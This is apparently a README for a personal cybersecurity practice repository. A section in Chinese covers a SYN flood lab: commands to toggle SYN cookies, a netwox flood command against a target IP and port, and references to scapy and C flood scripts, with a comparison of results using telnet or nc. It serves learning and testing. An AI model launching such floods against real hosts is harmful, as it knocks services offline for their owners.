# Cyber-security-practice
ALL cyber-security-practice, include exploit loophole , web attack ,cryptographic, system explotation, developing tools and so on
## TCP协议漏洞利用
- `sysctl -w net.ipv4.tcp_syncookies=0/1`
- netwox `sudo netwox 76 -i IP -p PORT`
- scapy `python syn_flood.py`
- `syn_flood.c`  \
比较syn-cookies启用和不启用的情况下，攻击的效果（攻击前后，用telnet或者nc连接目标主机端口进行测试）
